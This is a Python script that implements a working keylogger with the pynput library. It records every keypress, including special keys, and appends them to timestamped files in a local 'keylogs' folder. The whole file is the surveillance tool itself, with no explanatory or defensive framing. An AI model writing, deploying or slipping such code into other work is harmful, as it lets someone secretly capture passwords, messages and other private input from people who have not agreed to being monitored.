from pynput import keyboard
import logging
from datetime import datetime
import os

log_dir = "keylogs"
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")

logging.basicConfig(filename=log_file, level=logging.INFO, format='%(message)s')

class KeyLogger:
    def __init__(self):
        self.log_buffer = []

    def key_pressed(self, key):
        try:
            char = key.char
            self.log_buffer.append(char)
        except AttributeError:
            self.log_buffer.append(f'[{key}]')
        self.flush_buffer()

    def flush_buffer(self):
        if len(self.log_buffer) > 10:
            with open(log_file, 'a') as log:
                log.write(''.join(self.log_buffer))
                log.write('\n')
            self.log_buffer = []

    def start(self):
        with keyboard.Listener(on_press=self.key_pressed) as listener:
            listener.join()

if __name__ == '__main__':
    logger = KeyLogger()
    logger.start()
